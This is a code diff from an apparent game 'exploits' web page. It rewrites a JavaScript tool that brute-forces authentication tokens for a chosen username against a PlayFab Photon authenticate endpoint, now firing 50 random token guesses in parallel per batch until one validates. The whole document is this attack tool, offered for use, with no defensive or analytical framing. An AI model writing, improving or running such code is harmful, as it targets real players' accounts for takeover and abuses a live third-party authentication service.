@@ -1329,60 +1329,90 @@
       }
     }
 
-    function generateRandomToken() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      let token = '';
-      for (let i = 0; i < 50; i++) {
-        token += chars[Math.floor(Math.random() * chars.length)];
-      }
-      return token;
-    }
-
-    async function checkToken(username, token) {
-      try {
-        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`);
-        return await res.json();
-      } catch (error) {
-        return { error: error.message };
-      }
-    }
-
-    function startBruteforce() {
-      if (bruteforceRunning) return;
-      const username = document.getElementById("playFabUsername").value.trim();
-      if (!username) {
-        document.getElementById("bruteforceOutput").textContent = "Please enter a PlayFab Username.";
-        return;
-      }
-      bruteforceRunning = true;
-      const output = document.getElementById("bruteforceOutput");
-      output.textContent = "Starting bruteforce...\n";
-
-      async function tryToken() {
-        if (!bruteforceRunning) return;
-        const token = generateRandomToken();
-        output.textContent += `Trying ${token}...\n`;
-        const result = await checkToken(username, token);
-        if (result.error) {
-          output.textContent += `Error: ${result.error}\n`;
-        } else {
-          output.textContent += `Response: ${JSON.stringify(result)}\n`;
-          if (result.resultCode === 1) {
-            output.textContent += `✅ Valid token found: ${token}\n`;
-            stopBruteforce();
-            return;
-          }
+     function generateRandomToken() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for (let i = 0; i < 50; i++) {
+                token += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return token;
         }
-        output.scrollTop = output.scrollHeight;
-        tryToken();
-      }
-      tryToken();
-    }
 
-    function stopBruteforce() {
-      bruteforceRunning = false;
-      document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
-    }
+        // Function to check a token against the API
+        async function checkToken(username, token) {
+            try {
+                const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                return { token, result: await res.json() };
+            } catch (error) {
+                return { token, error: error.message };
+            }
+        }
+
+        // Function to start the bruteforce process
+        async function startBruteforce() {
+            if (bruteforceRunning) return;
+            const username = document.getElementById("playFabUsername").value.trim();
+            const output = document.getElementById("bruteforceOutput");
+            
+            if (!username) {
+                output.textContent = "Please enter a PlayFab Username.";
+                return;
+            }
+
+            bruteforceRunning = true;
+            output.textContent = "Starting bruteforce...\n";
+
+            // Recursive function to try batches of tokens
+            async function tryTokenBatch() {
+                if (!bruteforceRunning) return;
+
+                // Generate 50 tokens at once
+                const tokens = Array.from({ length: 50 }, () => generateRandomToken());
+                
+                // Check all tokens in parallel
+                const results = await Promise.all(
+                    tokens.map(token => checkToken(username, token))
+                );
+
+                let foundValid = false;
+                for (const { token, result, error } of results) {
+                    if (error) {
+                        output.textContent += `Error for ${token}: ${error}\n`;
+                    } else {
+                        output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
+                        if (result.resultCode === 1) {
+                            output.textContent += `✅ Valid token found: ${token}\n`;
+                            foundValid = true;
+                            break; // Stop the batch if a valid token is found
+                        }
+                    }
+                }
+
+                output.scrollTop = output.scrollHeight;
+
+                // If no valid token was found and bruteforce is still running, continue
+                if (!foundValid && bruteforceRunning) {
+                    setTimeout(tryTokenBatch, 0); // Use setTimeout to avoid stack overflow
+                } else if (foundValid) {
+                    stopBruteforce();
+                }
+            }
+
+            tryTokenBatch();
+        }
+
+        // Function to stop the bruteforce process
+        function stopBruteforce() {
+            bruteforceRunning = false;
+            const output = document.getElementById("bruteforceOutput");
+            output.textContent += "Bruteforce stopped.\n";
+            output.scrollTop = output.scrollHeight;
+        }
 
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
